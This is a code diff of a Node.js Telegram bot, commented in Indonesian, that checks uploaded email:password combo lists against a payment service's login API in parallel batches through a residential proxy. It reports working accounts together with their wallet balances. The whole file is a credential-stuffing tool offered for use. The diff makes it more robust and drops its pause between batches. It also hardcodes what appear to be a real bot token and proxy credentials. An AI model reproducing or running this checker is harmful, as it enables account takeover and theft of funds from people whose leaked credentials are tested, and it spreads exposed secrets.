@@ -4,19 +4,18 @@ const { Telegraf } = require('telegraf');
 const axios = require('axios');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
-// MASUKKAN TOKEN BOT KAMU DI SINI
+// Token Bot
 const BOT_TOKEN = '8627582721:AAHnw24k_cUjtuveRpCV9C5UDDc9RQMibOo';
-const bot = new Telegraf(BOT_TOKEN);
 
-// Proxy DataImpulse Kamu
+// Konfigurasi Telegraf dengan Handler Error
+const bot = new Telegraf(BOT_TOKEN, {
+    handlerTimeout: 900000 // Naikkan limit ke 15 menit agar tidak timeout saat download file besar
+});
+
+// Proxy DataImpulse
 const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:f4cd725960d1892a@gw.dataimpulse.com:823');
 
-// Fungsi Jeda (Sleep)
-const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-// ==========================================
-// FUNGSI INTI PENGECEKAN API
-// ==========================================
+// Fungsi Pengecekan
 async function checkAccount(username, password) {
     try {
         const authPayload = JSON.stringify({
@@ -34,7 +33,7 @@ async function checkAccount(username, password) {
             },
             httpsAgent: proxyAgent,
             validateStatus: () => true,
-            timeout: 15000
+            timeout: 20000 // Timeout per akun 20 detik
         });
 
         if (authReq.data?.AuthenticationResult) {
@@ -43,79 +42,59 @@ async function checkAccount(username, password) {
                 headers: { "Authorization": idToken, "x-country-code": "608" },
                 httpsAgent: proxyAgent,
                 validateStatus: () => true,
-                timeout: 10000
+                timeout: 15000
             });
-            const balance = walletReq.data?.data?.balanceAmount || 0;
-            return { status: 'live', balance: balance };
+            return { status: 'live', balance: walletReq.data?.data?.balanceAmount || 0 };
         }
-        return { status: 'die', msg: authReq.data?.__type?.replace('Exception', '') || 'Invalid' };
+        return { status: 'die' };
     } catch (e) {
-        return { status: 'error', msg: 'Timeout' };
+        return { status: 'error' };
     }
 }
 
-// ==========================================
-// HANDLER TELEGRAM
-// ==========================================
-bot.start((ctx) => {
-    ctx.reply('🤖 RecnomPay Termux Mode Ready!\n\nKirim file .txt berisi combo email:pass.\nBot akan cek 30 akun -> Kirim hasil -> Jeda 10 detik -> Lanjut otomatis.');
-});
+bot.start((ctx) => ctx.reply('🤖 RecnomPay Anti-Crash Ready!'));
 
 bot.on('document', async (ctx) => {
-    if (!ctx.message.document.file_name.endsWith('.txt')) return ctx.reply('❌ Kirim file .txt!');
+    if (!ctx.message.document.file_name.endsWith('.txt')) return;
 
-    const waitMsg = await ctx.reply('⏳ Mengunduh file...');
-    
+    const waitMsg = await ctx.reply('⏳ Sedang mengunduh file besar... Mohon tunggu.');
+
     try {
         const fileLink = await ctx.telegram.getFileLink(ctx.message.document.file_id);
-        const response = await axios.get(fileLink.href);
+        
+        // Gunakan timeout pada axios download file juga
+        const response = await axios.get(fileLink.href, { timeout: 300000 }); 
         const lines = response.data.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
 
-        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, `✅ Terdeteksi <b>${lines.length} akun</b>.\nMemulai pengecekan massal...`, { parse_mode: 'HTML' });
+        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, `✅ Terdeteksi <b>${lines.length} akun</b>. Memulai check...`, { parse_mode: 'HTML' });
 
-        let totalChecked = 0;
-        let batchLive = [];
-
-        // LOOPING MASSAL (UNLIMITED)
         for (let i = 0; i < lines.length; i += 30) {
             const chunk = lines.slice(i, i + 30);
-            
-            // Proses 30 akun secara paralel dalam satu batch
             const results = await Promise.all(chunk.map(async (line) => {
                 const [u, p] = line.split(':');
+                if(!u || !p) return null;
                 const res = await checkAccount(u.trim(), p.trim());
                 return { u, p, res };
             }));
 
-            // Filter hasil yang LIVE
-            results.forEach(item => {
-                totalChecked++;
-                if (item.res.status === 'live') {
-                    batchLive.push(`<code>${item.u}:${item.p}</code> | Bal: <b>${item.res.balance}</b>`);
-                }
-            });
-
-            // Kirim Laporan per 30 Akun
-            let report = `<b>📊 LAPORAN BATCH (${totalChecked}/${lines.length})</b>\n━━━━━━━━━━━━━━━━━━\n`;
-            report += batchLive.length > 0 ? batchLive.join('\n') : '<i>Tidak ada LIVE di batch ini.</i>';
-            report += `\n━━━━━━━━━━━━━━━━━━`;
+            let batchLive = results.filter(item => item && item.res.status === 'live');
             
-            await ctx.reply(report, { parse_mode: 'HTML' });
-            batchLive = []; // Reset list live untuk batch berikutnya
-
-            // Jeda 10 Detik jika belum selesai semua
-            if (totalChecked < lines.length) {
-                const sleepMsg = await ctx.reply(`😴 Sedang jeda 10 detik agar aman...`);
-                await sleep(10000); 
-                await ctx.telegram.deleteMessage(ctx.chat.id, sleepMsg.message_id).catch(() => {});
-            } else {
-                await ctx.reply('🏁 <b>SEMUA PROSES SELESAI!</b>');
+            if (batchLive.length > 0) {
+                let report = `<b>📊 LIVE BATCH (${i + chunk.length}/${lines.length})</b>\n━━━━━━━━━━━━━━━━━━\n`;
+                report += batchLive.map(item => `<code>${item.u}:${item.p}</code> | Bal: ${item.res.balance}`).join('\n');
+                await ctx.reply(report, { parse_mode: 'HTML' }).catch(() => {});
             }
         }
+        await ctx.reply('🏁 Semua akun selesai dicek!');
     } catch (err) {
-        ctx.reply('❌ Error: ' + err.message);
+        console.error("Error Processing File:", err.message);
+        await ctx.reply('❌ Gagal memproses file: ' + err.message);
     }
 });
 
-// Jalankan Bot
-bot.launch().then(() => console.log("Bot Running di Termux!"));
+// GLOBAL ERROR HANDLER - BIAR GAK MATI
+bot.catch((err, ctx) => {
+    console.log(`Oops, encountered an error for ${ctx.updateType}`, err);
+});
+
+bot.launch().then(() => console.log("Bot Running di Termux (Anti-Crash Mode)"));
